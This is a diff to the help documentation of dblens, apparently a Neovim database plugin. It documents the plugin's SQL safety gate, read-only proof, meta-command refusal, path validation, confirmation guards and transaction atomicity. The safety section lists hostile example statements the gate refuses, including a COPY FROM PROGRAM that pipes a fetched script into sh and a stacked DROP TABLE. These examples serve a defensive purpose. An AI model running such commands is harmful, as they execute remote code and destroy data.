@@ -402,19 +402,58 @@ KEYMAP OVERRIDES                                       *dblens-config-keymaps*
 
 Each `keymaps` scope maps an action name to a new left-hand side, a list of
 them, or `false` to disable the binding. The action names are listed in
-|dblens-mappings|; an unknown action is an error, not a silent no-op. >lua
+|dblens-mappings|; an unknown action is an error, not a silent no-op, and it is reported
+by `setup{}` rather than when the pane is first opened. A whole scope can be
+`false` to bind nothing in it. >lua
     require('dblens').setup({
       keymaps = {
-        global  = { toggle = '<leader>D', txn_begin = false },
-        results = { detail = { '<CR>', 'gd' } },
+        global  = false,  -- bind none of the <leader>d* maps
+        results = { detail = { '<CR>', 'gd' }, sort = false },
       },
     })
 <
 ==============================================================================
 9. Safety                                                      *dblens-safety*
 
-Every write goes through one function in the session, so the rules hold no
-matter which part of the UI asked.
+Every statement dblens sends - a browsed page, a filter, ad-hoc editor SQL,
+EXPLAIN, a cell edit, a committed batch - goes through `Session:run`, which
+puts it through `Session:gate` before a client process exists. Read-only, the
+confirmation requirement and the refusal of client meta-commands are enforced
+there, not in whichever part of the UI asked.
+
+THE READ PROOF                                            *dblens-safety-read*
+
+A statement counts as a read only when dblens can PROVE it is one: a single
+statement led by SELECT, WITH, VALUES, TABLE, SHOW, DESCRIBE, a reporting
+PRAGMA, or an EXPLAIN that does not ANALYZE; with no write verb anywhere in
+it, no INTO/OUTFILE redirect, no stacked second statement, and no punctuation
+outside the set that appears in real SQL operators.
+
+Everything else is treated as a WRITE, including verbs dblens does not
+recognise. So each of these is a write, and refused on a read-only
+connection: >
+    WITH d AS (DELETE FROM t RETURNING *) SELECT count(*) FROM d
+    COPY t FROM PROGRAM 'curl evil.sh|sh'
+    DO $$ BEGIN DELETE FROM t; END $$
+    CALL wipe()
+    SELECT * INTO copy_of_users FROM users
+    PRAGMA user_version = 42
+    SELECT 1; DROP TABLE t
+<
+EXPLAIN ANALYZE is classified by the statement INSIDE it, because on
+PostgreSQL and MySQL it runs that statement. `EXPLAIN ANALYZE DELETE ...` is
+therefore a destructive write: refused on a read-only connection, and gated by
+the destructive confirmation elsewhere, with the float saying plainly that it
+will run. Plain EXPLAIN only plans, and stays a read.
+
+CLIENT META-COMMANDS                                      *dblens-safety-meta*
+
+psql runs `\!` as a shell command in the middle of a statement, and
+`sqlite3 -batch` still honours `.shell`. Neither is SQL, so no connection flag
+covers them. The gate refuses any statement starting with `.` or containing an
+unquoted backslash, on every connection. sqlite3 is additionally run with
+`-safe`, which refuses `.shell`, `.load`, `.import` and ATTACH at the client;
+that needs sqlite3 3.34 or newer.
 
 READ-ONLY CONNECTIONS                                *dblens-safety-read-only*
 
@@ -423,19 +462,26 @@ A connection with `read_only = true`, or every connection when
 naming the connection. The refusal lives in the session, not in the mapping
 that called it.
 
+CONNECTION PATHS                                          *dblens-safety-path*
+
+A sqlite `path` is expanded with `~` and `$VAR` substitution only - never
+through |expand()|, whose wildcard expansion RUNS backticks through the shell.
+A backtick, a wildcard or a leading `-` is rejected when the connection is
+validated, so a hostile shared connections file cannot run a command merely by
+being opened. Export paths are expanded the same way.
+
 THE CONFIRM GATE                                       *dblens-safety-confirm*
 
-Statements are classified by their leading verb. UPDATE, DELETE, REPLACE,
-MERGE, DROP, TRUNCATE, ALTER, RENAME, GRANT and REVOKE are destructive;
-INSERT, CREATE, COMMENT, ANALYZE, VACUUM, REINDEX, ATTACH and DETACH are
-non-destructive writes. Anything else is treated as a read.
+UPDATE, DELETE, REPLACE, MERGE, DROP, TRUNCATE, ALTER, RENAME, GRANT and
+REVOKE are destructive; other writes are not.
 
 With `safety.confirm_destructive` (the default) a destructive statement is
 shown in a preview float first: the exact SQL, the verb and target of each
 destructive statement, and a flag when it affects a whole object with no
 WHERE. It runs only when you confirm. `safety.confirm_write` extends the same
-gate to non-destructive writes. An unconfirmed write is refused by the
-session, not merely left undrawn.
+gate to non-destructive writes. The two are evaluated per class, so a script
+holding both an INSERT and a DROP is gated by both settings. An unconfirmed
+write is refused by the session, not merely left undrawn.
 
 Before a single destructive ad-hoc statement, an adapter that can estimate
 without executing shows the planner's row estimate: PostgreSQL through
@@ -455,10 +501,26 @@ is refused rather than applied to several rows. The preview says which of the
 two identifications is in use. An INSERT targets no existing row and carries
 no guard.
 
+In transaction mode the guard is emitted INTO the committed batch, immediately
+before the change it guards, so it is re-checked against the database as the
+transaction sees it rather than as it was at queue time. A guard that no
+longer matches exactly one row aborts the whole batch.
+
+Outside a transaction the guard and the write are two separate client
+invocations, so a concurrent writer between them is not excluded. The guard
+bounds mistakes, not races.
+
 FILTERS                                                 *dblens-safety-filter*
 
-A WHERE typed into the results filter is checked before it is spliced into a
-statement: a `;` or any write verb in the fragment is rejected.
+A WHERE typed into the results filter is checked by an allow-list before it is
+spliced into a statement. Rejected: any write verb, a comment (which would
+comment out the LIMIT/OFFSET appended after it), a backslash, an unclosed
+quote, and any punctuation outside the SQL operator set - which drops `;` and
+`\` together. A column named after a SQL verb can still be filtered on by
+quoting it.
+
+The filter bar is still raw SQL. The check stops a fragment escaping the
+statement; it does not stop an expensive or volatile function call.
 
 ==============================================================================
 10. Transactions                                         *dblens-transactions*
@@ -473,9 +535,20 @@ pretending it landed, and the winbar and |dblens.statusline()| show
 "TXN n pending". `<leader>dP` lists the queue.
 
 `<leader>dC` commits. The whole queue is replayed, in order, inside one client
-invocation wrapped in `BEGIN; ...; COMMIT;`. The batch is genuinely atomic: it
-succeeds, or it leaves nothing behind. If it fails, the queue is kept so you
-can fix the problem and retry.
+invocation wrapped in `BEGIN; ...; COMMIT;`, with each change's row guard
+emitted immediately before it. Atomicity comes from the client's own flags -
+`sqlite3 -bail`, `psql -v ON_ERROR_STOP=1`, and the mysql client's default
+abort - because without them sqlite3 prints the error, SKIPS the failing
+statement and still runs the trailing COMMIT.
+
+If a statement fails, nothing landed, the report names which change failed
+(and says so plainly when the failure was a guard that no longer matches one
+row), and the queue is kept so you can fix it and retry.
+
+If the commit is instead INTERRUPTED - a timeout, `<C-c>`, or the output cap -
+the outcome is not known, so the queue is discarded rather than kept:
+replaying it could apply a committed INSERT twice, or re-run a DELETE whose
+guard has already been spent. dblens says so and tells you to check the table.
 
 `<leader>dR` rolls back, which is free because nothing was ever sent. It
 discards the queue and leaves transaction mode.
